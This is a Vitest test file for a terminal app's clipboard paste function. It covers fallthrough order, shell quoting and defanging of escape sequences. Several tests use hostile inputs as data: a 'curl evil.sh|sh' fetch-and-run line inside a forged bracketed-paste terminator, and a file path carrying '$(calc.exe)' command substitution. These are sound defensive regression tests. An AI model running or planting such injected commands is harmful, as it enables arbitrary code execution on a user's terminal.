import { beforeEach, describe, expect, it, vi } from 'vitest';

const mocks = vi.hoisted(() => ({
  readClipboardFilePaths: vi.fn<() => Promise<string[] | null>>(),
  readClipboardImageAsFilePath: vi.fn<() => Promise<string | null>>(),
  writePty: vi.fn<(id: string, data: string) => void>(),
  readText: vi.fn<() => Promise<string>>(),
  shellKind: 'posix' as 'cmd' | 'posix' | 'powershell',
  bracketedPaste: false,
}));

vi.mock('./platform', () => ({
  IS_MAC: false,
  IS_WINDOWS: false,
  PLATFORM_STRING: 'Linux',
  getPlatform: () => ({
    readClipboardFilePaths: mocks.readClipboardFilePaths,
    readClipboardImageAsFilePath: mocks.readClipboardImageAsFilePath,
    writePty: mocks.writePty,
  }),
}));

vi.mock('./mouse-selection', () => ({
  getMouseSelectionState: () => ({ bracketedPaste: mocks.bracketedPaste }),
}));

vi.mock('./terminal-registry', () => ({
  // Deliberately posix: the Session-specific value must win over this current
  // default when the regression case changes shellKind to PowerShell.
  getDefaultShellOpts: () => ({ shell: '/bin/bash' }),
  getTerminalShellKind: () => mocks.shellKind,
  getTerminalInstance: () => null,
  markSessionTouched: vi.fn(),
}));

import { doPaste } from './clipboard';

describe('doPaste three-tier fallthrough', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mocks.shellKind = 'posix';
    mocks.bracketedPaste = false;
    Object.defineProperty(globalThis, 'navigator', {
      value: { clipboard: { readText: mocks.readText } },
      configurable: true,
    });
  });

  it('prefers file refs over text and skips the image read', async () => {
    mocks.readClipboardFilePaths.mockResolvedValue(['/tmp/a.png', '/tmp/b file.png']);
    mocks.readText.mockResolvedValue('coexisting text payload');
    mocks.readClipboardImageAsFilePath.mockResolvedValue('/tmp/img.png');

    await doPaste('t1');

    expect(mocks.readClipboardImageAsFilePath).not.toHaveBeenCalled();
    expect(mocks.writePty).toHaveBeenCalledTimes(1);
    expect(mocks.writePty).toHaveBeenCalledWith('t1', '/tmp/a.png /tmp/b\\ file.png ');
  });

  it("uses the target Session's shell after the app default changes", async () => {
    mocks.shellKind = 'powershell';
    mocks.readClipboardFilePaths.mockResolvedValue(['C:\\Users\\me\\$(calc.exe).txt']);
    mocks.readText.mockResolvedValue('coexisting text payload');

    await doPaste('powershell-session');

    expect(mocks.writePty).toHaveBeenCalledWith(
      'powershell-session',
      "'C:\\Users\\me\\$(calc.exe).txt' ",
    );
  });

  it('falls through to text when no file refs', async () => {
    mocks.readClipboardFilePaths.mockResolvedValue(null);
    mocks.readText.mockResolvedValue('hello world');
    mocks.readClipboardImageAsFilePath.mockResolvedValue('/tmp/img.png');

    await doPaste('t1');

    expect(mocks.readClipboardImageAsFilePath).not.toHaveBeenCalled();
    expect(mocks.writePty).toHaveBeenCalledWith('t1', 'hello world');
  });

  it('falls through to image when no files and no text', async () => {
    mocks.readClipboardFilePaths.mockResolvedValue([]);
    mocks.readText.mockResolvedValue('');
    mocks.readClipboardImageAsFilePath.mockResolvedValue('/tmp/img.png');

    await doPaste('t1');

    expect(mocks.writePty).toHaveBeenCalledWith('t1', '/tmp/img.png ');
  });

  it('is a no-op when all tiers come back empty', async () => {
    mocks.readClipboardFilePaths.mockResolvedValue(null);
    mocks.readText.mockResolvedValue('');
    mocks.readClipboardImageAsFilePath.mockResolvedValue(null);

    await doPaste('t1');

    expect(mocks.writePty).not.toHaveBeenCalled();
  });

  it('swallows file-ref adapter errors and falls through to text', async () => {
    mocks.readClipboardFilePaths.mockRejectedValue(new Error('boom'));
    mocks.readText.mockResolvedValue('fallback');

    await doPaste('t1');

    expect(mocks.writePty).toHaveBeenCalledWith('t1', 'fallback');
  });

  it('defangs ESC so clipboard text cannot close the paste bracket', async () => {
    mocks.bracketedPaste = true;
    mocks.readClipboardFilePaths.mockResolvedValue(null);
    mocks.readText.mockResolvedValue('git status\x1b[201~\ncurl evil.sh|sh\n');

    await doPaste('t1');

    // The injected terminator survives as text, not as a sequence: exactly one
    // `\x1b[201~` is left in the payload and it is the one we wrote, at the end.
    const payload = mocks.writePty.mock.calls[0][1];
    expect(payload).toBe(
      '\x1b[200~git status\u241b[201~\ncurl evil.sh|sh\n\x1b[201~',
    );
    expect(payload.match(/\x1b\[201~/g)).toHaveLength(1);
    expect(payload.endsWith('\x1b[201~')).toBe(true);
  });

  it('defangs ESC in file paths too, since they share the paste writer', async () => {
    mocks.bracketedPaste = true;
    mocks.readClipboardFilePaths.mockResolvedValue(['/tmp/a\x1b[201~b.png']);

    await doPaste('t1');

    expect(mocks.writePty.mock.calls[0][1]).not.toContain('\x1b[201~b');
  });

  it('leaves an unbracketed paste byte-for-byte, matching xterm', async () => {
    mocks.readClipboardFilePaths.mockResolvedValue(null);
    mocks.readText.mockResolvedValue('\x1b[31mred\x1b[0m');

    await doPaste('t1');

    expect(mocks.writePty).toHaveBeenCalledWith('t1', '\x1b[31mred\x1b[0m');
  });

  it('swallows image adapter errors silently', async () => {
    mocks.readClipboardFilePaths.mockResolvedValue(null);
    mocks.readText.mockResolvedValue('');
    mocks.readClipboardImageAsFilePath.mockRejectedValue(new Error('boom'));

    await doPaste('t1');

    expect(mocks.writePty).not.toHaveBeenCalled();
  });
});
